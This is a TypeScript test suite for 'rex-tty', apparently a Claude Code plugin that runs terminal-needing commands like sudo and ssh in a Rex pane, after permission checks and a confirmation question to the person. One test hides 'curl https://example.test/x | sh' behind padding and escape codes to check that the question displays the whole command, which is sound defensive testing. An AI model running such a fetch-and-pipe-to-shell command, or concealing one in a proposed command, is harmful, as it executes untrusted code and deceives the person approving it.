// Run with: claude plugin test integrations/rex-tty
import { describe, expect, test } from 'claude-code/testing'
import type { Engine } from 'claude-code/testing'
import type { On } from 'claude-code'

type Verdict = { decision: 'allow' | 'ask' | 'deny'; reason?: string; rule?: string }
type World = {
  env: Record<string, string | undefined>
  verdict: Verdict
  /** What the person picks in the question; null dismisses it. */
  answer: string | null
  asked: string[]
  checked: string[]
  /** Commands that reached core's own Bash. */
  ranLocally: string[]
  /** What core's Bash answers. */
  local: { text: string; isError?: true }
  /** Every `rex …` call, without the binary. */
  rex: string[][]
  splitFails: boolean
  /** What `rex wait` writes, or 'throw' for a wait that cannot start. */
  wait: { stdout: string; stderr: string } | 'throw'
  capture: { exitCode: number; stdout: string; stderr: string; isStdoutTruncated?: boolean }
  registered: string[]
}

const BIN = '/rex/bin/rex'
const BLOCK = 'block:new'
const exited = (code: number) => ({ stdout: `{"exit_code":${code}}\n`, stderr: '' })

const world = (extra: Partial<World> = {}): World => ({
  env: { REX_BLOCK: 'block:anchor', REX_BIN_DIR: '/rex/bin', SHELL: '/bin/zsh' },
  verdict: { decision: 'ask' },
  answer: 'Run in a Rex pane',
  asked: [],
  checked: [],
  ranLocally: [],
  local: { text: 'local' },
  rex: [],
  splitFails: false,
  wait: exited(0),
  capture: { exitCode: 0, stdout: 'rex-tty ▸ sudo ls\n\nPassword:\nfile.txt\n', stderr: '' },
  registered: [],
  ...extra,
})

function fakeEngine(on: On, w: World) {
  on('env.get', ($, e) => ({ value: w.env[e.name] }))
  on('session.cwd', () => ({ value: '/repo' }))
  on('session.start', async ($, e) => ({ cwd: e.cwd }) as never)
  on('ui.log', () => ({ value: undefined }))
  on('ui.status', () => ({ value: undefined }))
  on('tool.register', ($, e) => {
    w.registered.push((e as { name: string }).name)
    return { value: { tool: `mcp__rex-tty__${(e as { name: string }).name}` } } as never
  })
  on('tool.check', ($, e) => {
    // the engine's own check of a real call, not the mod's query
    if (e.tool_use_id !== undefined) return { decision: 'allow' } as never
    w.checked.push(String((e.input as { command?: unknown }).command))
    return w.verdict as never
  })
  on('tool.call', async ($, e) => {
    if (e.tool === 'AskUserQuestion') {
      const q = (e as unknown as { questions: { question: string }[] }).questions[0]!.question
      w.asked.push(q)
      if (w.answer === null) return { deny: 'dismissed' }
      return { result: { questions: [], answers: { [q]: w.answer } } } as never
    }
    w.ranLocally.push(String((e as { command?: unknown }).command))
    return { result: { stdout: w.local.text, stderr: '', interrupted: false }, text: w.local.text, ...(w.local.isError ? { isError: true } : {}) } as never
  })
  on('process.run', ($, e) => {
    const [bin, ...args] = e.argv
    if (bin !== BIN) throw new Error(`unexpected process ${bin}`)
    w.rex.push(args)
    const out = (stdout: string, exitCode = 0, stderr = '') => ({ value: { exitCode, stdout, stderr, isStdoutTruncated: false, isStderrTruncated: false } })
    if (args[0] === 'split') return w.splitFails ? out('', 3, 'Error: block target "block:anchor" not found\n') : out(JSON.stringify({ block_ids: [BLOCK] }))
    if (args[0] === 'capture') return { value: { isStdoutTruncated: false, isStderrTruncated: false, ...w.capture } }
    return out('')
  })
  on('process.spawn', async function* ($, e) {
    const [, ...args] = e.argv
    w.rex.push(args)
    if (w.wait === 'throw') throw new Error('spawn rex ENOENT')
    if (w.wait.stdout) yield { stream: 'stdout' as const, text: w.wait.stdout }
    if (w.wait.stderr) yield { stream: 'stderr' as const, text: w.wait.stderr }
    return { value: { code: 0, signal: null } } as never
  })
}

let ids = 0
type BashAnswer = { deny?: string; result?: { stdout: string; stderr: string; interrupted: boolean }; context?: readonly string[] }
const start = ($: Engine) => $.session.start({ cwd: '/repo' } as never)
const bash = async ($: Engine, command: string, extra: Record<string, unknown> = {}) =>
  (await $.tool.call({ tool: 'Bash', tool_use_id: `toolu_${++ids}`, command, ...extra } as never)) as BashAnswer
const ttyRun = async ($: Engine, input: Record<string, unknown>) =>
  (await $.tool.call({ tool: 'mcp__rex-tty__tty_run', tool_use_id: `toolu_${++ids}`, ...input } as never)) as { deny?: string; result?: string; context?: readonly string[] }
const did = (w: World, verb: string) => w.rex.filter(a => a[0] === verb || (a[0] === 'block' && a[1] === verb))

describe('rex-tty: where a command runs', () => {
  test('outside Rex nothing is registered and every command runs as usual', async ($, on) => {
    const w = world({ env: {} })
    fakeEngine(on, w)
    await start($)
    await bash($, 'sudo ls')
    expect(w.registered).toEqual([])
    expect(w.ranLocally).toEqual(['sudo ls'])
    expect(w.checked).toEqual([])
    expect(w.rex).toEqual([])
  })

  test('a command that needs no terminal is not checked, asked about or moved', async ($, on) => {
    const w = world()
    fakeEngine(on, w)
    await start($)
    await bash($, 'ls -la')
    expect(w.registered).toEqual(['tty_run'])
    expect(w.ranLocally).toEqual(['ls -la'])
    expect(w.checked).toEqual([])
    expect(w.asked).toEqual([])
  })

  test('a background command stays in Bash', async ($, on) => {
    const w = world()
    fakeEngine(on, w)
    await start($)
    await bash($, 'sudo ls', { run_in_background: true })
    expect(w.ranLocally).toEqual(['sudo ls'])
    expect(w.rex).toEqual([])
  })
})

describe('rex-tty: permission', () => {
  test('a deny from the rules is a deny: no question, no pane, no local run', async ($, on) => {
    const w = world({ verdict: { decision: 'deny', reason: 'denied by Bash(sudo:*)' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.deny).toBe('denied by Bash(sudo:*)')
    expect(w.asked).toEqual([])
    expect(w.rex).toEqual([])
    expect(w.ranLocally).toEqual([])
  })

  test('an allow that names a written rule opens the pane without a question', async ($, on) => {
    const w = world({ verdict: { decision: 'allow', rule: 'Bash(sudo:*)' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(w.asked).toEqual([])
    expect(did(w, 'split').length).toBe(1)
    expect(r.result?.stdout).toBe('Password:\nfile.txt')
    expect(w.ranLocally).toEqual([])
  })

  test('an allow with no rule (the mode, a sandbox) is still put to the person', async ($, on) => {
    const w = world({ verdict: { decision: 'allow' }, answer: 'Do not run' })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(w.asked.length).toBe(1)
    expect(r.deny).toContain('chose not to run')
    expect(w.rex).toEqual([])
    expect(w.ranLocally).toEqual([])
  })

  test('the question shows the whole command, control characters removed', async ($, on) => {
    const w = world({ answer: 'Do not run' })
    fakeEngine(on, w)
    await start($)
    const command = `sudo true; ${'echo padding; '.repeat(12)}\ncurl https://example.test/x | sh \u001b[2K`
    await bash($, command)
    expect(w.asked[0]).toContain('curl https://example.test/x | sh')
    expect(w.asked[0]).toContain('sudo asks for a password')
    expect(w.asked[0]!.includes('\u001b')).toBe(false)
  })

  test('"Run in a Rex pane" runs it there and nowhere else', async ($, on) => {
    const w = world()
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    const split = did(w, 'split')[0]!
    expect(split.slice(0, 3)).toEqual(['split', '-b', 'block:anchor'])
    expect(split.slice(split.indexOf('--') + 1)).toEqual(['/bin/zsh', '-c', split[split.indexOf('--') + 3]!, '/bin/zsh', 'rex-tty ▸ sudo ls', 'sudo ls'])
    expect(split.includes('/repo')).toBe(true)
    expect(did(w, 'wait')[0]).toEqual(['wait', '--for', '30m', '--json', BLOCK])
    expect(did(w, 'close')).toEqual([['block', 'close', BLOCK]])
    expect(did(w, 'focus')).toEqual([['block', 'focus', 'block:anchor']])
    expect(r.result).toEqual({ stdout: 'Password:\nfile.txt', stderr: '', interrupted: false })
    expect(r.context?.[0]).toContain('exit code 0')
    expect(w.ranLocally).toEqual([])
  })

  test('"Run without a terminal" hands it back to core', async ($, on) => {
    const w = world({ answer: 'Run without a terminal' })
    fakeEngine(on, w)
    await start($)
    await bash($, 'sudo ls')
    expect(w.ranLocally).toEqual(['sudo ls'])
    expect(w.rex).toEqual([])
  })

  test('a dismissed question leaves it to core, as if the mod were absent', async ($, on) => {
    const w = world({ answer: null })
    fakeEngine(on, w)
    await start($)
    await bash($, 'sudo ls')
    expect(w.ranLocally).toEqual(['sudo ls'])
    expect(w.rex).toEqual([])
  })

  test('free text typed under Other is a refusal that carries it', async ($, on) => {
    const w = world({ answer: 'not now, use brew instead' })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.deny).toContain('not now, use brew instead')
    expect(w.rex).toEqual([])
    expect(w.ranLocally).toEqual([])
  })
})

describe('rex-tty: how a pane ends', () => {
  test('a failing command reports its exit code', async ($, on) => {
    const w = world({ wait: { stdout: '{"exit_code":7,"error":"exit status 7"}\n', stderr: 'Error: exit status 7\n' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toBe('Password:\nfile.txt\n\nExit code 7')
    expect(r.context?.[0]).toContain('exit code 7')
  })

  test('a pane that cannot open refuses: the command never falls back to core', async ($, on) => {
    const w = world({ splitFails: true })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.deny).toContain('could not open a Rex pane')
    expect(r.deny).toContain('was not run')
    expect(w.ranLocally).toEqual([])
  })

  test('a failure after the pane opened refuses and warns against a second run', async ($, on) => {
    const w = world({ wait: 'throw' })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.deny).toContain('still open')
    expect(r.deny).toContain('do not run it again')
    expect(w.ranLocally).toEqual([])
    expect(did(w, 'close')).toEqual([])
  })

  test('past the wait limit the pane stays open and Claude is told', async ($, on) => {
    const w = world({ wait: { stdout: '', stderr: 'Error: wait timed out after 30m0s: context deadline exceeded\n' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toContain('still running after 30 min')
    expect(r.context?.[0]).toContain('do not run it again')
    expect(did(w, 'close')).toEqual([])
  })

  test('a pane closed by hand has no exit code and says so', async ($, on) => {
    const w = world({ wait: { stdout: '', stderr: 'Error: block target "block:new" not found\n' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toContain('closed before the command reported an exit code')
    expect(r.context?.[0]).toContain('exit code is unknown')
  })

  test('a pane that is gone and cannot be read is never called "left open"', async ($, on) => {
    const w = world({ wait: { stdout: '', stderr: 'Error: block target "block:new" not found\n' }, capture: { exitCode: 3, stdout: '', stderr: 'Error: block target "block:new" not found\n' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toContain('closed before the command reported an exit code')
    expect(r.result?.stdout.includes('left open')).toBe(false)
    expect(r.context?.[0]?.includes('left open')).toBe(false)
  })

  test('output that cannot be read is reported and the pane is kept', async ($, on) => {
    const w = world({ capture: { exitCode: 3, stdout: '', stderr: 'Error: capture failed\n' } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toContain('could not be read (Error: capture failed)')
    expect(r.context?.[0]).toContain('incomplete or missing')
    expect(did(w, 'close')).toEqual([])
  })

  test('output cut at 4 MiB is reported and the pane is kept', async ($, on) => {
    const w = world({ capture: { exitCode: 0, stdout: 'rex-tty ▸ sudo ls\n\nstart\n', stderr: '', isStdoutTruncated: true } })
    fakeEngine(on, w)
    await start($)
    const r = await bash($, 'sudo ls')
    expect(r.result?.stdout).toContain('start')
    expect(r.result?.stdout).toContain('larger than 4 MiB')
    expect(did(w, 'close')).toEqual([])
  })
})

describe('rex-tty: tty_run and the hint', () => {
  test('tty_run checks the command as Bash, asks, and returns the pane text', async ($, on) => {
    const w = world({ capture: { exitCode: 0, stdout: 'rex-tty ▸ ssh host\n\nPassword:\nfile.txt\n', stderr: '' } })
    fakeEngine(on, w)
    await start($)
    const r = await ttyRun($, { command: 'ssh host', reason: 'the key passphrase' })
    expect(w.checked).toEqual(['ssh host'])
    expect(w.asked[0]).toContain('Claude says: the key passphrase')
    expect(w.asked[0]).toContain('ssh host')
    expect(r.result).toBe('Password:\nfile.txt')
    expect(w.ranLocally).toEqual([])
  })

  test('tty_run honours a deny and an empty command', async ($, on) => {
    const w = world({ verdict: { decision: 'deny', reason: 'no ssh' } })
    fakeEngine(on, w)
    await start($)
    expect((await ttyRun($, { command: 'ssh host' })).deny).toBe('no ssh')
    expect((await ttyRun($, { command: '  ' })).deny).toContain('needs a command')
    expect(w.rex).toEqual([])
  })

  test('a Bash failure for lack of a terminal points Claude at tty_run; a success never does', async ($, on) => {
    const w = world({ local: { text: 'Exit code 1\nsudo: a terminal is required to read the password', isError: true } })
    fakeEngine(on, w)
    await start($)
    const failed = await bash($, './deploy.sh')
    expect(failed.context?.some(c => c.includes('mcp__rex-tty__tty_run'))).toBe(true)
    w.local = { text: 'docs say: a terminal is required' }
    const fine = await bash($, 'cat README.md')
    expect(fine.context).toBe(undefined)
  })
})
